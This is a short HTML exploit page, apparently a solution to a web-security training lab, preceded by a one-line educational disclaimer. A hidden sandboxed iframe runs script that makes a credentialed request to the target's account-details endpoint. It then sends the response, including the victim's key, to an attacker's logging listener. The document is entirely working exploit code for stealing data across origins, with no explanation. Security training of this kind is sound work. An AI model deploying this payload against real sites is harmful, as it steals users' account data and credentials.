*This information is only for the purposes of education and skills development.*

`<html>`
    `<body>`
        `<iframe style="display: none;" sandbox="allow-scripts" srcdoc="`
        `<script>`
            `var xhr = new XMLHttpRequest();`
            `var url = 'https://ac371f531f693ef3c07b84de00630017.web-security-academy.net'`

            `xhr.onreadystatechange = function() {`
                `if (xhr.readyState == XMLHttpRequest.DONE) {`
                    `fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)`
                `}`
            `}`

            `xhr.open('GET', url + '/accountDetails', true);`
            `xhr.withCredentials = true;`
            `xhr.send(null);`
        `</script>"></iframe>`
    `</body>`
`</html>`